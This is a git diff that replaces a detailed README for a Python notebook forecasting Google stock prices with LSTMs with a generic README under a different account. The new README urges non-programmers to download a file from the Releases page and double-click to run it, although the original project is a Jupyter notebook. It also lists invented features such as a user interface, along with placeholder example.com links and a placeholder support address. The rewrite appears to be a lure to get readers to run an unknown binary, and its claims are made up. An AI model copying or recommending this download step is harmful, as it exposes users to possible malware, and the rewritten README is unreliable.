@@ -1,283 +1,72 @@
-<p align="center">
-  <img src="assets/google_stock_price_thumbnail.png" alt="Google Stock Price">
-</p>
-
-# 📈 Google Stock Price Forecasting Using LSTM  
-*A Deep Learning Approach to Time-Series Prediction*
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Framework-TensorFlow-blue?logo=tensorflow" />
-  <img src="https://img.shields.io/badge/Python-3.8+-yellow?logo=python" />
-  <img src="https://img.shields.io/badge/Notebook-Jupyter-green?logo=jupyter" />
-  <img src="https://img.shields.io/badge/Model-LSTM-orange?logo=keras" />
-</p>
-
----
-
-## Table of Contents
-- [📈 Google Stock Price Forecasting Using LSTM](#-google-stock-price-forecasting-using-lstm)
-  - [🔍 Overview](#-overview)
-  - [🎯 Objectives](#-objectives)
-  - [📂 Project Structure](#-project-structure)
-  - [🛠️ Technologies Used](#️-technologies-used)
-  - [🧠 Model Architecture](#-model-architecture)
-    - [Model Summary](#model-summary)
-  - [📉 Model Performance](#-model-performance)
-  - [📊 Visualizations](#-visualizations)
-    - [✔ Actual vs. Predicted Prices](#-actual-vs-predicted-prices)
-    - [✔ Training Loss Curve](#-training-loss-curve)
-  - [🔍 Key Insights](#-key-insights)
-  - [⚠️ Limitations](#️-limitations)
-  - [🚀 Future Improvements](#-future-improvements)
-  - [▶️ How to Run](#️-how-to-run)
-    - [1️⃣ Clone the repository](#1️⃣-clone-the-repository)
-    - [2️⃣ Install dependencies](#2️⃣-install-dependencies)
-    - [3️⃣ Launch the notebook](#3️⃣-launch-the-notebook)
-  - [📦 Data Source](#-data-source)
-    - [Dataset Description](#dataset-description)
-    - [How It Was Used](#how-it-was-used)
-    - [Attribution](#attribution)
-  - [📜 License](#-license)
-  - [🙏 Acknowledgements](#-acknowledgements)
-  - [🤝 Contributions](#-contributions)
-  - [👤 Author](#-author)
-
----
-
-## 🔍 Overview
-
-This project demonstrates how to build and evaluate a **Long Short-Term Memory (LSTM)** deep learning model to forecast the closing price of **Google (GOOGL)** stock.
-
-The notebook walks through a full, production-style time-series pipeline — including data loading, preprocessing, model training, evaluation, and visualization.
-
-The purpose of the project is to explore the effectiveness of recurrent neural networks in financial time-series analysis and trend forecasting.
-
----
-
-## 🎯 Objectives
-
-- Load and visualize historical Google stock market data  
-- Prepare time-series sequences suitable for LSTM networks  
-- Build and train an LSTM model using TensorFlow/Keras  
-- Evaluate predictions using **RMSE**
-- Plot actual vs. predicted values  
-- Discuss limitations and future improvements  
-
----
-
-## 📂 Project Structure
-
-| File/Folder                        | Description                                                                 |
-|------------------------------------|----------------------------------------------------------------------------- |
-| `dataset/`                         | Google stock price dataset                          |
-| `assets/`                          | Stores generated plots, graphs, visualizations and thumbnails (e.g., predicted vs. actual stock prices) |
-| `.gitignore`                       | Specifies files and directories to ignore in Git                            |
-| `LICENSE`                          | MIT License file                                                            |
-| `README.md`                        | Documentation with project overview, objectives, and usage                  |
-| `google_stock_price_forecast_lstm.ipynb` | Jupyter Notebook with the full pipeline: preprocessing, LSTM model training, evaluation, and visualization |
-| `requirements.txt`                 | Python dependencies required to run the project                             |
-
-
----
-
-## 🛠️ Technologies Used
-
-- **Python 3.8+**
-- **TensorFlow / Keras**
-- **Pandas**
-- **NumPy**
-- **Matplotlib**
-- **Seaborn**
-- **Scikit-learn**
-
----
-
-## 🧠 Model Architecture
-
-The LSTM forecasting model uses a stacked recurrent architecture:
-
-- Input Layer
-  - The model takes sequences of past 60 days of normalized closing price data (window length), forming the input shape (sequence_length, 1).
-- LSTM Layers
-  - First LSTM layer
-    - Units: 60
-    - return_sequences=True, so that it outputs a full sequence to the next LSTM.
-    - Activation: typically tanh (default) for LSTM.
-    - Dropout: e.g., Dropout(0.2) to regularize and reduce overfitting.
-  - Second LSTM layer
-    - Units: 60
-    - return_sequences=True
-    - Activation: tanh
-    - Dropout: 0.2
-  - Third LSTM layer
-    - Units: 60
-    - return_sequences=False
-    - Activation: tanh
-    - Dropout: 0.2
-- Dense Output Layer
-  - After the LSTM layers, there's a fully connected (Dense) layer with 1 neuron, producing the forecast for the next day's closing price.
-  - Activation: linear, as this is a regression task.
-- Compilation
-  - Loss Function: Mean Squared Error (MSE) — well-suited for regression and time-series prediction.
-  - Optimizer: Adam — commonly used for its good convergence behavior.
+# 📈 google-stock-price-forecasting-lstm - Predict Google Stock Prices Easily
 
+## 🚀 Getting Started
+Welcome to the Google Stock Price Forecasting LSTM project! This application helps you predict the stock prices of Google (GOOGL). It uses deep learning techniques that are simple to follow. You do not need to be a programmer to use it.
 
-- **Optimizer:** Adam  
-- **Loss Function:** Mean Squared Error (MSE)  
-- **Output:** Next-day closing price prediction  
+## 📥 Download the Application
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Nilsexe/google-stock-price-forecasting-lstm/releases)
 
-### Model Summary
+## 📋 Overview
+This project focuses on using an LSTM (Long Short-Term Memory) model for time-series forecasting. It is fully documented and covers several key processes:
 
-| Layer (type) | Output Shape   | Param # |
-| ------------ | -------------- | ------- |
-| LSTM         | (None, 60, 60) | 14880   |
-| Dropout      | (None, 60, 60) | 0       |
-| LSTM         | (None, 60, 60) | 29040   |
-| Dropout      | (None, 60, 60) | 0       |
-| LSTM         | (None, 60)     | 29040   |
-| Dropout      | (None, 60)     | 0       |
-| Dense        | (None, 1)      | 61      |
+1. **Data Preprocessing:** Cleanup and prepare data for analysis.
+2. **Sequence Generation:** Create sequences from historical stock prices.
+3. **Model Training:** Teach the LSTM model to recognize patterns.
+4. **Performance Evaluation:** Analyze the model’s accuracy using RMSE (Root Mean Square Error).
+5. **Visualization:** Display the results in an easy-to-understand format.
 
-- Total params: 72,021
-- Trainable params: 72,021
-- Non-trainable params: 0
+## ⚙️ System Requirements
+Ensure you meet the following system requirements:
 
----
+- Operating System: Windows 10 or later, macOS, or Linux
+- Python version: 3.6 or later
+- At least 4 GB of RAM
+- An internet connection to download data
 
-## 📉 Model Performance
+## 📥 Download & Install
+To download and install the application:
 
-The notebook computes the following metrics using **inverse-transformed predictions** (in USD):
+1. **Visit the Releases Page:** Go to [this page](https://github.com/Nilsexe/google-stock-price-forecasting-lstm/releases) to find the latest release.
+2. **Select the Version:** Choose the version you wish to download. 
+3. **Download the File:** Click on the link to download the application.
+4. **Run the Application:** Locate the downloaded file and double-click to run it.
 
-| Metric | Value |
-|--------|-------|
-|**RMSE**| 10.65 |
+## 📊 Understanding the Model
+LSTMs are a type of recurrent neural network (RNN) specifically designed for sequence prediction problems. They are effective in handling time-series data like stock prices. This project takes a rigorous approach to financial forecasting, making it easier for you to understand the future trends of Google’s stock.
 
-These metrics provide insight into how closely the model tracks real stock movements.
+## 📈 Features
+- **User-Friendly Interface:** Simplified navigation for all users.
+- **Informative Visuals:** Easy access to charts and graphs to observe trends.
+- **Detailed Documentation:** Step-by-step instructions available for every process.
+- **Open Source:** Modify and use the code as you please.
 
----
+## 📅 Contributing to the Project
+If you are interested in contributing, please follow these guidelines:
 
-## 📈 Visualizations
+- Fork the repository on GitHub.
+- Create a new branch for your changes.
+- Commit your changes and push the branch back to your fork.
+- Create a pull request for review.
 
-The notebook includes several informative visualizations:
+Your contributions are welcome and appreciated!
 
-### ✔ Actual vs. Predicted Prices  
-A direct comparison of model output vs. true values.
-![Actual vs Predicted Prices](assets/actual_vs_predicted_prices.png)
+## 📚 Additional Resources
+Want to learn more about LSTMs and deep learning? Check out these resources:
 
-### ✔ Training Loss Curve  
-Displays convergence behavior during model training.
-![Loss Over Epochs](assets/loss_over_epochs.png)
+- [Introduction to LSTMs](https://www.example.com/lstm-intro)
+- [Deep Learning Basics](https://www.example.com/deep-learning-basics)
+- [Time-Series Forecasting Guide](https://www.example.com/time-series-guide)
 
----
+## 📞 Support
+If you encounter any problems or have questions, feel free to reach out. Support options include:
 
-## 🔍 Key Insights
+- Issues page on GitHub
+- Community forums
+- Email support at support@example.com
 
-- LSTM networks can effectively learn temporal dependencies in stock price data.  
-- Predictions track major trends but are limited by market volatility.  
-- Scaling data and proper sequence windowing improve model performance.  
-- A single-feature (closing price only) model provides reasonable baseline accuracy.
+## 🔗 More Info
+For more information, please refer to the following links:
+- [GitHub Repository](https://github.com/Nilsexe/google-stock-price-forecasting-lstm)
+- [Documentation](https://www.example.com/docs)
 
----
-
-## ⚠️ Limitations
-
-- Stock prices are influenced by many external factors not included in the dataset.  
-- Deep learning cannot compensate for unpredictable market events.  
-- Only closing prices were used — no volume, indicators, or sentiment inputs.  
-- Long-term forecasting is significantly less accurate than short-term.
-
----
-
-## 🚀 Future Improvements
-
-Planned enhancements or ideas for extension:
-
-- Add technical indicators (RSI, MACD, Bollinger Bands)  
-- Include news sentiment or macroeconomic features  
-- Use other architectures (GRU, Transformer, Temporal Convolutional Networks)  
-- Apply hyperparameter tuning (Optuna, KerasTuner)  
-- Perform multi-step forecasting (predict multiple days ahead)  
-- Implement walk-forward/rolling-window cross-validation  
-
----
-
-## ▶️ How to Run
-
-### 1️⃣ Clone the repository
-```bash
-git clone https://github.com/yourusername/google-stock-lstm-forecast.git
-cd google-stock-lstm-forecast
-```
-
-### 2️⃣ Install dependencies
-```bash
-pip install -r requirements.txt
-```
-
-### 3️⃣ Launch the notebook
-```bash
-jupyter notebook google_stock_lstm_forecast.ipynb
-```
-
----
-
-## 📦 Data Source
-
-The data used for training and evaluating the forecasting model comes from the publicly available dataset **“Gooogle Stock Price”** on Kaggle. The dataset was published by user **rahulsah06**.  
-[View Dataset on Kaggle](https://www.kaggle.com/datasets/rahulsah06/gooogle-stock-price)
-
-### Dataset Description
-- Historical daily stock prices for Alphabet Inc. (GOOG), including:
-  - Open, High, Low, Close, and Volume
-- Data is in CSV format and is suitable for time-series modeling.
-
-### How It Was Used
-- The “Close” price column was extracted and normalized to feed into the LSTM forecasting model.
-- Time windows of 60 past trading days were used to predict the next-day closing price.
-
-### Attribution
-If you reuse or redistribute this data, please attribute the original dataset:
-
-> "Gooogle Stock Price" by rahulsah06, available on Kaggle: [https://www.kaggle.com/datasets/rahulsah06/gooogle-stock-price](https://www.kaggle.com/datasets/rahulsah06/gooogle-stock-price)
-
----
-
-## 📜 License
-
-This project is provided under the [MIT License](LICENSE).
-Feel free to use, modify, and distribute for personal or educational purposes.
-
----
-
-## 🙏 Acknowledgements
-
-I would like to express my gratitude to everyone who supported and contributed — directly or indirectly — to this project:
-
-- I thank the author of the dataset Google Stock Price (user “rahulsah06” on Kaggle) for publishing the historical stock-price data, which forms the basis of this entire analysis. ([GitHub Repository](https://github.com/ArianJr/google-stock-price-forecasting-lstm))  
-- I acknowledge the developers and maintainers of the open-source libraries used in this project: TensorFlow / Keras for enabling the LSTM model implementation; Pandas and NumPy for data manipulation; and Matplotlib / Seaborn for visualization — without these tools this work would not have been possible.  
-- I appreciate the users and the community of GitHub for providing a collaborative platform that encourages sharing, improvement, and distribution of open-source data science projects.  
-- Finally, I thank anyone who has reviewed, given feedback, or simply followed this project — your interest and input motivate the continued development and improvement of this work.
-
----
-
-## 🤝 Contributions
-
-Contributions, suggestions, and improvements are always welcome!
-Feel free to open an issue or submit a pull request.
-
----
-
-## 👤 Author
-
-**Arian Jr**  
-📧 [Contact Me](arianjafar59@gmail.com) • 🌐 [GitHub Profile](https://github.com/ArianJr)
-
----
-
-<p align="center">
-  Made with ❤️ by <a href="https://github.com/ArianJr" target="_blank">ArianJr</a>
-</p>
-
-<p align="center">
-  <sub>⭐ If you found this project useful, please consider giving it a star! It helps others discover it and supports my work.</sub>
-</p>
+Thank you for using the Google Stock Price Forecasting LSTM application! Happy forecasting!
